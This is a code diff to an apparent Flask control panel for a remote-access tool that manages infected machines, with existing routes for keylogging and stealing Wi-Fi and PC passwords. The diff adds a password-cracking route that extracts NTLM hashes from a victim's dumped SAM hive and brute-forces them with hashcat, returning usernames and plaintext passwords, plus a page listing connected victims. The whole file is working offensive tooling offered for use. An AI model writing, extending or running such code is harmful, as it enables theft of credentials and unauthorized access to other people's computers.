@@ -1,6 +1,9 @@
+import multiprocessing
 import os
 import subprocess
 import threading
+import webbrowser
+
 import moviepy.editor as movpy
 from pydub import AudioSegment
 import ffmpeg
@@ -55,6 +58,10 @@ def handle_disconnection(func: Callable) -> Callable:
 def is_connected(ip: str) -> bool:
     return ip in ovils and ovils[ovils.index(ip)].connected
 
+@app.route('/')
+@handle_errors
+def hello_world():
+    return render_template("index.html", ovils=[ovil.ip for ovil in ovils if ovil.connected])
 
 @app.route('/ovil/<ip>/connect/')
 @handle_errors
@@ -225,6 +232,57 @@ def stop_keyLogger(ip):
     return result
 
 
+@app.route(r"/ovil/<ip>/steal_passwords/crack/")
+@handle_errors
+def crack_page(ip):
+    return render_template("big_massage.html", tab="cracking_passwords", msg=crack(ip))
+
+
+@handle_errors
+@handle_disconnection
+def crack(ip):
+    if Path("cracked.txt").exists():
+        with open("cracked.txt", "r") as c:
+            d = c.read()
+            if d:
+                return d
+    ovil = ovils[ovils.index(ip)]
+    pc = steal_pc(ovil)
+    return crack_passwords(pc, None)
+
+
+def crack_passwords(passwords: str, timeout: int | None = MAX_TIME_TO_WAIT_FOR_CRACKING_HASH) -> str:
+    try:
+        lines = passwords[passwords.index("============== SAM hive secrets =============="):passwords.index("============== SECURITY hive secrets ==============")].split("\n")
+        hashes = []
+        users = {}
+        for line in lines:
+            line = line.strip()
+            if line.endswith(":::"):
+                line = line[0:-3]
+                line = line.split(":")
+                hashes.append(line[-1])
+                users[line[0]] = line[-1]
+        with open("hash.txt", "w") as h:
+            h.write("\n".join(hashes))
+        with open("cracked.txt", "w") as c:
+            c.write("")
+        p = multiprocessing.Process(target=os.system, args=("hashcat64.exe -m 1000 -a3 -o cracked.txt hash.txt", ))
+        p.start()
+        p.join(timeout)
+        msg = ""
+        with open("cracked.txt", "r") as c:
+            for line in c.readlines():
+                line = line.strip()
+                if ":" in line:
+                    h, password = line.split(":")
+                    msg += f"{users[h]}:{password}"
+        return msg
+    except Exception as e:
+        return f"couldn't crack hash because {e}"
+
+
+
 @app.route("/ovil/<ip>/steal_passwords/")
 @handle_errors
 def steal_passwords(ip):
@@ -233,7 +291,7 @@ def steal_passwords(ip):
     ovil = ovils[ovils.index(ip)]
     wifi = steal_wifi(ovil)
     pc = steal_pc(ovil)
-    return render_template("passwords.html", wifi=wifi, pc=pc)
+    return render_template("passwords.html", wifi=wifi, pc=pc + "\n\n")
 
 
 @handle_errors
@@ -763,6 +821,7 @@ def run(ip):
 
 
 def main():
+    webbrowser.open_new(r"http://127.0.0.1:5000")
     app.run(debug=False)
 
 
@@ -770,6 +829,6 @@ if __name__ == '__main__':
     main()
 
 
-# TODO: add support for service page and getting up on boot
 # TODO: make setup file
 # TODO: add decrypting ntlm hash by bruteforce
+
